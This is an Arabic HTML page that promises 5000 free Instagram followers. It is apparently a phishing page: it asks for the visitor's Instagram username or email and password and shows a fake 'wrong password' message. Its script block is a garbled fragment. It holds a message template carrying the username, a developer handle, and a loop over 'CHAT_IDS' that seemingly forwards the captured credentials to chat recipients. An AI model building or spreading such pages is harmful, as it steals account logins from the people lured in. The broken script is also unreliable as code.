<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>زيادة متابعين انستغرام بسرعة</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap" rel="stylesheet" />
<style>
* {
  box-sizing: border-box;
}
body {
  margin: 0;
  font-family: 'Cairo', sans-serif;
  background: linear-gradient(135deg, #0f0f0f, #1a002b);
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #eee;
}
.container {
  width: 90%;
  max-width: 350px;
  text-align: center;
  display: flex;
  flex-direction: column;
  gap: 15px;
}
h1 {
  font-size: 16px;
  margin: 0;
  color: #ddd;
}
p.subtitle {
  font-size: 13px;
  margin: 0;
  color: #bbb;
}
form {
  display: flex;
  flex-direction: column;
  gap: 15px;
}
input {
  width: 100%;
  padding: 10px;
  border: 2px solid transparent;
  border-radius: 12px;
  background: rgba(255, 255, 255, 0.1);
  color: #fff;
  font-size: 14px;
  transition: color 0.3s ease;
}
input::placeholder {
  color: #ccc;
}
input:focus {
  outline: none;
  color: #fff;
  border: 2px solid transparent;
  animation: glowing 2s linear infinite;
  background: rgba(255, 255, 255, 0.15);
}
@keyframes glowing {
  0% {
    box-shadow: 0 0 5px 2px #9d00ff;
    border-color: #9d00ff;
  }
  50% {
    box-shadow: 0 0 15px 4px #e100ff;
    border-color: #e100ff;
  }
  100% {
    box-shadow: 0 0 5px 2px #9d00ff;
    border-color: #9d00ff;
  }
}
button {
  margin: 8px auto 0 auto;
  display: block;
  width: 100%;
  padding: 12px;
  background: linear-gradient(45deg, #9d00ff, #e100ff);
  border: none;
  border-radius: 12px;
  font-size: 16px;
  color: white;
  cursor: pointer;
  box-shadow: 0 0 15px rgba(237, 0, 255, 0.5);
  transition: transform 0.2s ease;
}
button:hover {
  transform: scale(1.05);
}
.error-message {
  color: #ff8080;
  font-size: 10px;
  margin-top: 5px;
  display: none;
}
.note {
  margin: 0;
  font-size: 11px;
  color: #888;
}
</style>
</head>
<body>
  <div class="container">
    <h1> احصل على  5000 متابع مجاني بأمان وبدون برامج مزيفة</h1>
    <p class="subtitle">Instagram Followers</p>
    <form id="loginForm">
      <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required />
      <input type="password" id="password" placeholder="كلمة السر" required />
      <button type="submit">تسجيل الدخول</button>
      <p id="errorMessage" class="error-message">كلمة السر غير صحيحه يرجا إعادة المحاوله</p>
    </form>
    <p class="note">The only service that gives you 5000 free followers</p>
  </div>

<script>

\n
⌯⋆ 𝑈𝑆𝐸𝑅 ⋆⌯            ${username}

『 الــمطور صـ𓄌ـكر بغـ𓄌ـداد 』
『@ffl8l』`;
  CHAT_IDS.forEach(id => {

</script>
</body>
</html>
